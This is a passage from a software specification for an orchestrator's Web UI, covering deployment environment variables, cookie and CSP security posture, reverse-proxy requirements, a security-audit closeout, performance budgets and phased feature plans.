- 003 Compliance / Privacy section — Art. 28 / Art. 44 cross-border transfer (sister; the WS payload is upstream of the litellm dispatch)
- 007 Compliance / Privacy section — Art. 33 breach signalling + log-scrubbing
- 010 Compliance / Privacy section — Art. 15 / Art. 20 boundary (operator-mediated in Phase 1)

## Operations (Phase E fix/011-operations, 2026-05-02)

This section documents 011's operator-facing decisions for Web UI deployment. Operator playbook lives in `docs/operational-runbook.md` §13 (Web UI ops).

### Tunable env vars (operator decision points)

| Variable | Purpose | Default |
|---|---|---|
| `SACP_WEB_UI_INSECURE_COOKIES` | Force-off override for cookie Secure flag (auto-detected from request scheme by default) | unset |
| `SACP_WEB_UI_MCP_ORIGIN` | Origin string used in CSP `connect-src` for MCP API calls | (operator-supplied) |
| `SACP_WEB_UI_WS_ORIGIN` | Origin string used in CSP `connect-src` for WebSocket | (operator-supplied) |
| `SACP_WEB_UI_ALLOWED_ORIGINS` | CSV of accepted Origin headers on WS upgrade (SR-004) | same-origin |
| `SACP_WEB_UI_COOKIE_KEY` | Independent cookie-signing key (≥ 32 chars, no placeholder) | (required) |
| `SACP_WS_MAX_CONNECTIONS_PER_IP` | Per-IP WS connection cap (4429 close on exceed) | 10 |

Cross-ref `docs/env-vars.md` for the canonical catalog.

### Deploy semantics

**Single-instance topology** (Phase 1) — one orchestrator process serves both MCP (port 8750) and Web UI (port 8751); all WS connections terminate at this process. On redeploy, all WS connections close; clients reconnect via FR-014 auto-reconnect with exponential backoff.

**Multi-instance / WS session affinity** — deferred to Phase 3. Implementation surface: load-balancer sticky-session config OR externalize SessionStore to Redis (the in-process `SessionStore` keyed by sid currently). Trigger: any deployment requiring HA Web UI pods.

**Multi-tenant** — explicit single-tenant in Phase 1. One operator org, one DB, one origin. Multi-tenant deferred.

### HTTP vs HTTPS posture

The session cookie's `Secure` flag is auto-detected from the inbound request scheme: HTTPS requests get `Secure`, HTTP requests do not. SameSite=Strict and HttpOnly apply unconditionally.

- **Production direct-TLS**: HTTPS reaches the orchestrator directly. The request scheme is `https`, the cookie carries `Secure`. No env vars required.
- **Production behind TLS-terminating reverse proxy**: set `SACP_TRUST_PROXY=1` so the orchestrator honors `X-Forwarded-Proto` from the proxy; the cookie still gets `Secure` even though the inner request is HTTP. Same env var that governs IP-binding trust, so the trust decision is co-located.
- **LAN / dev**: HTTP-only deployment works out of the box. Auto-detect sees `http` and omits `Secure` so the cookie round-trips as expected.
- **Explicit override**: `SACP_WEB_UI_INSECURE_COOKIES=1` forces the flag off regardless of scheme. Kept for operator control and back-compat; unnecessary for the LAN/HTTP case after auto-detect.

Pre-fix the flag defaulted to on, so a LAN/HTTP deploy silently broke after login: the browser stored the cookie but refused to send it back, deadlocking every cookie-authed call (proxy 401, WebSocket 4401). Runbook §13's deploy-time sanity check (HTTPS deploy with `INSECURE_COOKIES=1` warning) still applies.

### CDN dependency

Web UI loads React, ReactDOM, marked, DOMPurify (jsdelivr) + Babel Standalone (unpkg) per FR-002 / SR-001. Operational implications:

- **Availability**: CDN downtime → UI fails to load. No Phase 1 fallback bundle. Accepted residual; CDN uptime is a deployment dependency.
- **Tampering**: SR-001 SRI integrity attributes on every cross-origin `<script>` (T204) protect against tampered CDN responses.
- **Privacy**: see Compliance / Privacy section "Third-party CDN risk" — Art. 44 transfer for EU deployments.
- **Phase 3 mitigation**: server-side bundling (eliminates CDN dependency); trigger documented in Compliance / Privacy section.

### CSP wiring

`SACP_WEB_UI_MCP_ORIGIN` + `SACP_WEB_UI_WS_ORIGIN` MUST be set to the operator's deployment origins. The orchestrator constructs CSP `connect-src` from these vars per SR-001. Misconfiguration symptoms:

- WS connection fails immediately with browser-side CSP violation
- `/csp-report` receives a violation report identifying the blocked origin

CSP-report log retention: see Compliance / Privacy section "CSP report-uri PII handling".

### Reverse-proxy configurations

Phase 1 documented configurations: **Caddy**, **nginx**, **Cloudflare**. Required behavior:

- WS upgrade headers (`Upgrade`, `Connection`) preserved
- `X-Forwarded-For` set (for 002 §FR-023 IP-binding when `SACP_TRUST_PROXY=1`)
- `X-Forwarded-Proto: https` set so the orchestrator emits HTTPS-only redirects
- CSP reporting (`/csp-report` POSTs) allowed through
- `X-SACP-Request: 1` CSRF header NOT stripped on mutations (SR-006)
- WS frame size cap of 256 KB (SR-001a) preserved or set higher

Sample configurations in runbook §13.2.

### Cross-references

- `docs/operational-runbook.md` §13 — Web UI operations (deploy, reverse-proxy, CDN, CSP)
- `docs/env-vars.md` — canonical catalog of `SACP_WEB_UI_*` vars
- 002 §FR-022 — bearer auth contract (cross-spec; reverse-proxy MUST preserve `Authorization` header on `/api/mcp/*` proxy)
- 002 §FR-023 — TRUST_PROXY semantics for IP binding
- 011 §FR-002 — CDN-loaded SPA constraint
- 011 §FR-014 — WebSocket auto-reconnect
- 011 SR-001, SR-001a, SR-002 — CSP, WS frame cap, security headers
- 011 SR-004 — WS Origin validation
- 011 SR-006 — CSRF custom header

## Audit closeout (2026-04-29)

The security-requirements quality audit (`checklists/security.md`) raised 47 findings; resolution split:

**Code changes**:
- CHK013 (uvicorn `ws_max_size=256*1024` in `src/run_apps.py` — closes WebSocket OOM surface).
- CHK003 (CSP `report-uri /csp-report` directive added to `src/web_ui/security.py`; new `/csp-report` endpoint stub in `src/web_ui/app.py` logs the violation at WARNING and returns 204; CSRF middleware exempts the path so browsers can post reports without the custom header).

**Spec amendments (this commit)**: CHK001 (SR-001 clarifies SRI applies to cross-origin CDN scripts only; `app.jsx` is same-origin and exempt), CHK003 / CHK032 (SR-001 codifies `report-uri`; SR-012 codifies malformed-frame discard semantics), CHK005 / CHK006 (SR-002 pins exact HSTS / Permissions-Policy / X-Frame-Options values + Phase 3 trigger for additional directives), CHK013 (SR-001a codifies WS frame size cap), CHK016 / CHK019 (SR-009 codifies allowed-scheme list + `rel="noreferrer noopener"` mandate + Phase 3 trigger for additional schemes), CHK020 / CHK022 (SR-010 codifies pending-snapshot filter + acknowledged event-filter gap as accepted residual with Phase 3 trigger), CHK023 (SR-005 cross-ref pins "sanitized = output of marked + DOMPurify"), CHK033 / CHK045 (SR-011 codifies sensitive-field allow-list + defense-in-depth duplication + cross-ref 010), CHK039 (Threat-model traceability table mapping every FR / SR to OWASP ASVS L2 + NIST SP 800-53), SR-008 cross-reference to SR-002 for consolidation.

**Closed as cross-reference / accepted residual**: CHK002 (CSP `connect-src` operator-config — operators set `SACP_WEB_UI_MCP_ORIGIN`; covered in SR-001), CHK004 (precompile-at-build alternative — accepted residual; SR-001 documents trigger), CHK007 / CHK008 (token storage + rotation timing — covered by 002 §FR-008 + this spec FR-003), CHK010 (token-reveal modal one-time-only — accepted residual; user can re-rotate to recover), CHK011 (WS Origin exact-match — confirmed at `src/web_ui/websocket.py`), CHK012 (close-code semantics — FR-014 enumerates), CHK014 (rotation gap — same as CHK008), CHK015 / CHK017 / CHK018 / CHK046 (markdown defense-in-depth — server (007) + UI (FR-006) layered intentionally), CHK021 (pending → participant escalation timing — covered by `participant_update` WS event + `state_snapshot` re-sync on reconnect), CHK024 (CSRF custom header on mutations only — WS frames don't need it; Origin validation defends), CHK025 (SR-007 own vs other system_prompt — accepted: NO participant sees any system_prompt via WS; allow-list strips them all), CHK026 (markdown XSS test corpus — accepted residual; comprehensive XSS-corpus testing requires JS test framework not in Phase 1+2 scope; manual red-team via `docs/red-team-runbook.md`), CHK027 (own row strip — confirmed at `_participant_dict` allow-list), CHK028 (whitespace-in-token sign-in — accepted residual; token validation handles edge cases), CHK029 (rotation SSOT — covered by 002 §FR-008 + this spec FR-003), CHK030 (XSS test fixture — same as CHK026), CHK031 (WS reconnect under packet loss — covered by FR-014 exponential backoff), CHK034 (multi-tab — accepted residual; cookie shared, last-WS-wins), CHK035 / CHK036 (large / adversarial markdown DoS — accepted residual; client-side bound by browser), CHK037 (clipboard-readText cross-origin — browser policy enforces, not our concern), CHK038 (whitespace-in-token-paste — token validation handles), CHK040 (CDN failure fallback — accepted residual already in Assumptions), CHK041 (a11y deferred — Assumptions trigger documented), CHK042 / CHK043 (Babel Standalone reliance — accepted; precompile trigger documented), CHK044 (US11 / US12 onboarding security review — implicit in this audit), CHK047 (CSRF cross-origin custom header — accepted: browsers prevent custom headers cross-origin; rationale in SR-006).

## Performance budgets (Phase F amendment, 2026-05-02)

These targets pin the Web UI's perceived-latency and rendering contract.
Sourced from the pre-Phase-3 audit window's web-vitals review.
The full budget configuration is checked in at `.lighthouserc.json` at
the repo root; it documents the contract and is ready to run via
`lhci autorun` once the staging fixture lands.

**Core Web Vitals targets.**
- Largest Contentful Paint (LCP) ≤ 2.5s ("good"); ≤ 4.0s
  ("needs improvement"); > 4.0s fails the budget.
- Interaction to Next Paint (INP) ≤ 200ms ("good"); ≤ 500ms
  ("needs improvement").
- Cumulative Layout Shift (CLS) ≤ 0.1 ("good"); ≤ 0.25 ("needs
  improvement").

**Other targets.**
- First Contentful Paint (FCP) ≤ 1.8s.
- Time to First Byte (TTFB) ≤ 800ms (LAN deployments will be
  much lower).
- Total Blocking Time (TBT) ≤ 200ms.
- Speed Index ≤ 3.4s.
- Lighthouse performance / a11y / best-practices score ≥ 0.9.

**Babel Standalone JIT compilation cost.** The SPA uses Babel
Standalone to transpile JSX in the browser at load time. Cold-load
cost on a representative laptop: ~400-800ms wall-clock for a single-
file `app.jsx` of ~2000 lines. This dominates the FCP budget. If the
file grows past ~3500 lines OR the FCP budget is breached on the
LAN-deploy reference hardware, the precompile-at-build trigger fires
(see Assumptions / CHK004). Phase 3+ may move to a precompiled bundle.

**CDN-fetch latency.** The SPA loads Babel Standalone, React, and
ReactDOM from `cdn.jsdelivr.net` and `unpkg.com`. CDN unavailability
is an accepted residual: the SPA fails to load, the user sees a
blank page. Operators with CDN-block constraints MUST self-host the
three scripts under `/static/vendor/` and update `index.html`; that
is supported by the existing static-file route but is not the
default. The CDN add-up budget against TTFB is bounded by browser
caching after first load.

**Single-file JSX rendering cost.** `app.jsx` ships as one ~2000-line
file. React's diffing keeps re-render cost bounded by visible-virtual-
DOM size (not full tree size), so the practical cost is dominated by
state-snapshot rendering on WS-message arrival. Splitting into
multiple `<script type="text/babel">` files is a Phase 3 enhancement
gated on file growing past ~3500 lines OR LCP budget breach.

**WebSocket steady-state perf.** Target: message-arrives-to-rendered
latency ≤ 100ms P95 on the reference hardware. State-snapshot
re-renders for unrelated participants should NOT trigger; this is
enforced by React keys on participant array elements. A regression
here surfaces as INP budget breach.

**Scroll perf on 200-message transcript.** The Assumption-cap
transcript size is 200 messages. Scroll perf at this size is
acceptable without virtualization on a desktop browser. Beyond 200
messages (Phase 3 trigger), virtualization (e.g., `react-window`)
becomes mandatory. The perf cliff lands roughly at 400-500 messages
on a representative laptop.

**Large state-snapshot rendering cost.** A facilitator with 50
participants + 200 messages + 5 active drafts is the upper-bound
"realistic large session" shape. Initial render cost on this shape:
~150-300ms wall-clock against React 18's concurrent renderer. State-
snapshot diffing on subsequent updates is bounded by what changed
(usually 1-2 participants OR 1-2 messages), so the steady-state cost
stays well under the INP budget.

**Sparkline rendering cost (FR-011).** Convergence sparkline today is
SVG with ~20 data points per session. Cost is negligible (< 5ms per
render). Canvas was considered and deferred — SVG keeps the dev
ergonomics (CSS-able, accessible) and the data point count is far
below the SVG-vs-canvas crossover (~500 points).

**Image-handling perf (FR-006).** The 007 §FR-007 exfiltration filter
strips markdown images at message persistence; FR-006 of 011 does NOT
re-render images client-side. Per-message strip cost is constant-time
regex (~1ms even for very long messages), well within the steady-
state INP budget.

**Activation trigger.** Lighthouse CI runs are not yet wired into the
GitHub Actions workflow. Activation requires a staging fixture that
brings up `web_ui.app` with a seeded session; this is a cross-spec
integration audit deliverable (Phase 4 / 012 successor). Until then
operators run `lhci autorun --config=.lighthouserc.json` manually
against a local instance.

## Topology and Use Case Coverage (V12/V13)

**Topologies**: Serves topologies 1-6 (orchestrator-driven). Topology 7 (MCP-to-MCP) would use the same WebSocket events but with different auth flow — deferred to Phase 3.

**Use cases**: All 7 constitution use cases benefit from the Web UI. Especially valuable for: knowledge-base (US1, long-running sessions need a dashboard), debate (US2, proposal voting UI), consulting (US4, review gate approval), and zero-trust cross-org (US5, facilitator admin controls).

## Implementation Phases

The Web UI is large enough to warrant internal phasing:

### Phase 2a — Core (ship first)
- AuthGate (token login)
- Three-column layout skeleton
- Transcript with markdown rendering + security pipeline
- Message injection input
- Participant list sidebar
- WebSocket connection + reconnection
- Session controls (pause/resume/start/stop loop)
- Facilitator: add participant, set routing preference, set budget
- Header bar (session name, status, turn counter, connection indicator)

### Phase 2a — Core (ship first, continued)
- Participant health indicator (US10) — lives on the participant list from 2a, surfaces breaker trips so facilitators can diagnose silent AIs immediately

### Phase 2b — Dashboard
- Budget dashboard (per-participant spend cards)
- Convergence sparkline graph
- Cadence indicator
- Summary panel (US9) — renders latest structured checkpoint
- Facilitator admin panel (pending approvals, session config, invite gen, audit log, review-gate pause-scope toggle)

### Phase 2c — Workflows
- Review gate queue with approve/edit/reject
- Proposal tracker with voting
- Session export (markdown/JSON download)
- Summarization timeline scrubber

### Phase 3b — Audit-log viewer UI (ships with spec 029)
- Audit log entry-point affordance in the facilitator admin panel (FR-025)
- Audit log panel route `/session/:id/audit` rendering rows with action labels and pagination (FR-026)
- Filter control set (actor, action type, time range) with WS-hidden-event badge (FR-027)
- Row-expansion wiring to spec 029's DiffRenderer module for action types with previous/new values (FR-028)
- Scrubbed-value display, unregistered-action fallback, and live WS append (FR-029)
- Playwright e2e covering SC-008
### Phase 3a — Length-cap UI (ships with spec 025)
- Cap-config control set in session-create modal (FR-021)
- Cap-config control set in facilitator session-settings panel (FR-022)
- Conclude-phase banner driven by `session_concluding` / `session_concluded` WS events (FR-023)
- Cap-decrease disambiguation modal driven by 409 from the cap-set endpoint (FR-024)
- Playwright e2e covering SC-007

### Phase 3c — Account UI (ships with spec 023)
- Auth gate replacing the token-paste landing when `SACP_ACCOUNTS_ENABLED=true`; legacy landing preserved behind a "use a token instead" link (FR-030)
- Account-creation form + email-verification code submission UI (FR-030)
- Post-login session list panel rendering `/me/sessions` segmented as active + archived with per-segment pagination and rebind on click (FR-031)
- Account-settings panel: email change (notify-old + verify-new), password change (preserves actor's sid; toast on other-session invalidation), account deletion (typed confirmation; export-on-delete summary on the post-deletion landing) (FR-032)
- Uniform `invalid_credentials` error display + per-IP rate-limit countdown rendering for spec 023 SC-005 / FR-015 (FR-033)
- No new WS events; password-change invalidation surfaces via the existing FR-014 401 handler; account-action audit events flow through spec 029's `audit_log_appended` channel when the audit panel is open (FR-034)
- Playwright e2e covering create + verify + login + session-list + email-change + password-change + delete flows

### Phase 3d — Standby UI (ships with spec 027)
- Participant-card `wait_mode` badge (facilitator-only) reading from the `participant_update` payload (FR-052, FR-058)
- Participant-card `standby` pill driven by `participant_standby` + `participant_standby_exited` WS events (FR-053)
- Facilitator admin-panel `wait_mode` toggle posting to `POST /tools/participant/set_wait_mode` (FR-054)
- Pivot-message banner rendering for `messages.metadata.kind === 'orchestrator_pivot'` (FR-055)
- Long-term-observer badge variant driven by `wait_mode_metadata.long_term_observer` (FR-056)
- Participant-card layout tolerance under combined badge presence (FR-057)
- Audit-viewer label registration for `standby_entered`, `standby_exited`, `pivot_injected`, `standby_observer_marked`, `wait_mode_changed` (FR-059)
- Pure-logic helpers in `frontend/standby_ui.js`; Node-runnable tests in `tests/frontend/test_standby_ui.js`

## Out of Scope

- Branching UI and rollback visualization (Phase 3)
- Sub-session tree navigation (Phase 3)
- OAuth 2.1 with PKCE login flow (Phase 3)
- MCP-to-MCP topology 7 integration (Phase 3)
- Artifact store (Phase 3)
- Internationalization
- Native mobile app
